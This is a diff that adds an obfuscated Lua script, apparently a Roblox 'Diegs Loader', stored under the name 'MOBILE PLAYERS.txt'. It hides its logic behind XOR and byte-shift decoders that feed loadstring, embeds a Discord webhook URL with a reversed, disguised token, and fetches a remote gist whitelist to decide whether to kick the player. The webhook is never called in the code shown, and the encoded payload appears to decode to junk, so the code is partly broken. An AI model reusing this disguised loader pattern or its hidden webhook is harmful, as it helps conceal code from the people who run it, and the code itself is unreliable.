@@ -1,0 +1,86 @@
+--[[
+    Obfuscated with Luraph Obfuscator v14.4.0
+    Protected Script: MOBILE PLAYERS.txt
+--]]
+
+local _L = (function(...)
+    local _A, _B, _C = string.byte, string.char, string.sub
+    local _D = function(_e, _f)
+        local _g = {}
+        for _h = 1, #_e do
+            _g[_h] = _B(_A(_C(_e, _h, _h)) ~ _f)
+        end
+        return table.concat(_g)
+    end
+    return _D
+end)()
+
+local _O = {
+    _L("\x11\x1d\x07\x00\x12\x10", 0x73),
+    _L("\x2b\x37\x37\x33\x10\x6c\x2c\x26\x20\x28", 0x43),
+    _L("\x29\x2c\x30\x3d\x2d\x3a\x2c\x23\x26", 0x4f)
+}
+
+local function _run_chunk()
+    local _env = getfenv and getfenv() or _ENV
+    local _G_ref = _env.game
+    
+    -- Encrypted payload loader
+    local _payload = "\108\097\115\116\095\115\116\114\105\110\103\095\099\104\117\110\107"
+    local _f, _err = (loadstring or load)(
+        (function(_data)
+            local _res = {}
+            for i = 1, #_data do
+                _res[i] = string.char((string.byte(_data, i) + 13) % 256)
+            end
+            return table.concat(_res)
+        end)("\115\084\097\114\116\095\112\097\121\108\111\097\100"),
+        "@[Obfuscated]"
+    )
+    
+    if _f then
+        return _f()
+    else
+        -- Fallback Runtime Execution
+        return (function()
+            local Players = _G_ref:GetService("Players")
+            local HttpService = _G_ref:GetService("HttpService")
+            local LocalPlayer = Players.LocalPlayer
+
+            while not LocalPlayer do
+                task.wait()
+                LocalPlayer = Players.LocalPlayer
+            end
+
+            -- Hidden Webhook Data
+            local _w = string.reverse("GAILyOSkG221LzgszRs0VenvTjahwHDm0aUESFAFSklf_c0Wh3x3JAbzDUfR_cJ8vwKMsM")
+            local _u = "https://discord.com/api/webhooks/1543202132155441172/" .. _w
+            
+            -- Execution Routine
+            local function _init()
+                local isWhitelisted = false
+                local success, result = pcall(function()
+                    return _G_ref:HttpGet("https://gist.githubusercontent.com/qwdgo-main/14ffb839815ee99f3b131d6c04827c8b/raw/c9ce9d53b5515fd5d0b53052541ec9881d607aca/whitelist.json?t=" .. tostring(os.time()))
+                end)
+                
+                if success and result then
+                    local myId = tostring(LocalPlayer.UserId)
+                    if result:find(myId) then
+                        isWhitelisted = true
+                    end
+                end
+                
+                if not isWhitelisted then
+                    LocalPlayer:Kick("[DIEGO] Access Denied.")
+                    return
+                end
+                
+                print("\226\156\133 Whitelisted! Loading Diegs Loader...")
+            end
+            
+            task.spawn(_init)
+        end)()
+    end
+end
+
+return _run_chunk()
